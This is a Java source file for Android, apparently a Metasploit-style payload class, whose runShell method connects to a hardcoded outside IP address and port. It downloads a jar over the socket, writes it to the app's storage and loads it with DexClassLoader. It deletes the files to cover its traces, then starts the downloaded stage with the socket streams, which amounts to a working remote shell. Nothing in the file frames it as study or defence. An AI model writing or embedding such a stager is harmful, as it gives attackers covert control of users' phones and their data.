package xyz.linglitel.msf_payload_android_l;

import android.content.Context;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

import dalvik.system.DexClassLoader;

public class Payload {

    public void runShell(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Socket ms = new Socket("60.215.128.117",26626);
                    DataInputStream inputStream = new DataInputStream(ms.getInputStream());
                    OutputStream dataOutputStream = new DataOutputStream(ms.getOutputStream());
                    Context context = BaseApplication.mContext;
                    String path = context.getFilesDir().toString();
                    String filePath = path + File.separatorChar + Integer.toString(new Random().nextInt(Integer.MAX_VALUE), 36);
                    String jarPath = filePath + ".jar";
                    String dexPath = filePath + ".dex";
                    File dexOutputDir = context.getCodeCacheDir();
                    String classFile = new String(getPayload(inputStream));
                    byte[] stageBytes = getPayload(inputStream);
                    File file = new File(jarPath);
                    if (!file.exists()) {
                        file.createNewFile();
                    }
                    FileOutputStream fop = new FileOutputStream(file);
                    fop.write(stageBytes);
                    fop.flush();
                    fop.close();
                    file.setReadOnly();
                    new File(dexPath).setReadOnly();
                    Class<?> loadClass = new DexClassLoader(jarPath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
                    Object stage = loadClass.newInstance();
                    file.delete();
                    new File(dexPath).delete();
                    Object[] parameters2 = new Object[]{path, null};
                    loadClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, Object[].class}).invoke(stage, new Object[]{inputStream,dataOutputStream,parameters2});
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }).start();
    }
        private static byte[] getPayload(DataInputStream dataInputStream) throws Exception {
            int readInt = dataInputStream.readInt();
            byte[] bytes = new byte[readInt];
            int i = 0;
            while (i < readInt) {
                int read = dataInputStream.read(bytes, i, readInt - i);
                if (read < 0) {
                    throw new Exception();
                }
                i += read;
            }
            return bytes;

        }
    }
